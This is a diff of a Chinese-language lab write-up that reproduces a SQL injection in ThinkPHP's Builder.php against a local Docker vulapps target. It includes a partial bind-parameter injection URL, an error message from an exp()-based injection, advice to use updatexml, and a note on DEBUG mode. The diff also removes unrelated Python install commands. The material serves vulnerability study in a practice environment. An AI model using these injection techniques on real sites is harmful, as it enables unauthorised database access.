@@ -1,4 +1,4 @@
-ThinkPHP Builder.php SQL注入漏洞
+﻿ThinkPHP Builder.php SQL注入漏洞
 获取环境:
 拉取镜像到本地
 $ docker pull medicean/vulapps:t_thinkphp_1
@@ -28,14 +28,6 @@ http://127.0.0.1/Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and (
 如果使用了参考文章中的 exp , 在尝试的时候出现1690:DOUBLE value is out of range in 'exp(~((select 'a'.'user()' from (select user() AS 'user()') 'a')))' 只返回了语句并未报出结果，是因为使用的 mysql exp 报错注入会因为 mysql 版本的原因可能会不成功，建议使用 updatexml 来进行
 
 注意：当DEBUG模式关闭时，不会显示报错信息！
-
-
-yum安装python3.6
-yum install https://centos7.iuscommunity.org/ius-release.rpm -y 
-yum install python36u -y 
-ln -s /bin/python3.6 /bin/python3
-yum install python36u-pip -y 
-ln -s /bin/pip3.6 /bin/pip3
 
 
 
